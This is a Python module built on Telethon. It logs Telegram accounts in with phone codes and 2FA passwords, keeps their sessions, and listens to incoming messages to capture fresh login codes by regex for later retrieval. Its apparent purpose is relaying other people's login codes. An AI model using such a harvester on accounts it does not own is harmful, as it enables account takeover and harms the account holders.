import asyncio
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, Tuple
import re
import logging

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from config import TELEGRAM_API_ID, TELEGRAM_API_HASH, SESSIONS_DIR

logger = logging.getLogger(__name__)
Path(SESSIONS_DIR).mkdir(exist_ok=True)

clients: Dict[str, TelegramClient] = {}
captured_codes: Dict[str, Dict] = {}
listening_tasks: Dict[str, asyncio.Task] = {}
pending_auth: Dict[str, Dict] = {}

def session_path(phone: str) -> str:
    clean = phone.replace("+","").replace(" ","")
    return str(Path(SESSIONS_DIR) / f"account_{clean}")

def extract_code(text: str) -> Optional[str]:
    patterns = [
        r'(?:код|code)[\s:]*(\d{5})',
        r'(\d{5})\s+is\s+your',
        r'telegram[\s:]*(\d{5})',
        r'(\d{5})\s+код',
        r'код\s+(\d{5})',
        r'(\d{5})\s+—\s+код',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

async def connect_session(phone: str) -> TelegramClient:
    path = session_path(phone)
    client = TelegramClient(path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
    await client.connect()
    clients[phone] = client
    return client

async def disconnect_session(phone: str):
    client = clients.pop(phone, None)
    if client:
        if phone in listening_tasks:
            listening_tasks[phone].cancel()
            del listening_tasks[phone]
        await client.disconnect()

async def is_authorized(phone: str) -> bool:
    client = clients.get(phone)
    if not client:
        client = await connect_session(phone)
    return await client.is_user_authorized()

async def request_code(phone: str) -> bool:
    """Отправляет код подтверждения"""
    try:
        client = clients.get(phone)
        if not client:
            client = await connect_session(phone)
        
        if await client.is_user_authorized():
            return True
        
        result = await client.send_code_request(phone)
        pending_auth[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash,
            'created_at': datetime.now()
        }
        return True
        
    except FloodWaitError as e:
        logger.error(f"Flood wait: {e.seconds}s")
        return False
    except Exception as e:
        logger.error(f"Request code error: {e}")
        return False

async def verify_code(phone: str, code: str) -> Tuple[bool, str]:
    """Проверяет код подтверждения"""
    if phone not in pending_auth:
        return False, "Нет ожидающего кода"
    
    try:
        auth_data = pending_auth[phone]
        client = auth_data['client']
        phone_code_hash = auth_data['phone_code_hash']
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            del pending_auth[phone]
            
            me = await client.get_me()
            logger.info(f"✅ Вход выполнен для {phone}: {me.first_name}")
            
            # Запускаем прослушку
            await start_listening(phone)
            
            return True, f"Вход выполнен! {me.first_name}"
            
        except SessionPasswordNeededError:
            return False, "2FA_REQUIRED"
            
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return False, str(e)

async def verify_2fa(phone: str, password: str) -> Tuple[bool, str]:
    """Проверяет 2FA пароль"""
    if phone not in pending_auth:
        return False, "Нет ожидающей сессии"
    
    try:
        auth_data = pending_auth[phone]
        client = auth_data['client']
        
        await client.sign_in(password=password)
        del pending_auth[phone]
        
        me = await client.get_me()
        logger.info(f"✅ 2FA пройдена для {phone}: {me.first_name}")
        
        await start_listening(phone)
        
        return True, f"Вход выполнен! {me.first_name}"
        
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return False, str(e)

async def start_listening(phone: str):
    if phone in listening_tasks:
        listening_tasks[phone].cancel()
        del listening_tasks[phone]
    
    client = clients.get(phone)
    if not client:
        client = await connect_session(phone)
    
    if not await client.is_user_authorized():
        logger.warning(f"⚠️ Аккаунт {phone} не авторизован для прослушки")
        return
    
    async def message_handler(event):
        try:
            text = event.message.message
            if not text:
                return
            
            code = extract_code(text)
            if code:
                logger.info(f"🎯 Найден код для {phone}: {code}")
                captured_codes[phone] = {
                    'code': code,
                    'timestamp': datetime.now(),
                    'expires_at': datetime.now() + timedelta(minutes=10)
                }
        except Exception as e:
            logger.error(f"Ошибка обработки сообщения для {phone}: {e}")
    
    client.add_event_handler(message_handler, events.NewMessage(incoming=True))
    
    async def keep_alive():
        try:
            while True:
                await asyncio.sleep(60)
                if not client.is_connected():
                    logger.info(f"🔄 Переподключение для {phone}")
                    await client.connect()
        except asyncio.CancelledError:
            pass
    
    task = asyncio.create_task(keep_alive())
    listening_tasks[phone] = task
    logger.info(f"📡 Запущена прослушка для {phone}")

async def get_code_for_account(phone: str) -> Optional[str]:
    if phone not in captured_codes:
        return None
    
    data = captured_codes[phone]
    if not data['code']:
        return None
    
    if data['expires_at'] < datetime.now():
        captured_codes[phone]['code'] = None
        return None
    
    return data['code']

async def wait_for_code(phone: str, timeout: int = 120) -> Optional[str]:
    start_time = datetime.now()
    
    if phone in captured_codes:
        captured_codes[phone]['code'] = None
    
    if phone not in listening_tasks:
        await start_listening(phone)
    
    while (datetime.now() - start_time).seconds < timeout:
        code = await get_code_for_account(phone)
        if code:
            return code
        await asyncio.sleep(2)
    
    return None

async def close_all():
    for phone, task in listening_tasks.items():
        task.cancel()
    listening_tasks.clear()
    
    for client in list(clients.values()):
        await client.disconnect()
    clients.clear()
    captured_codes.clear()
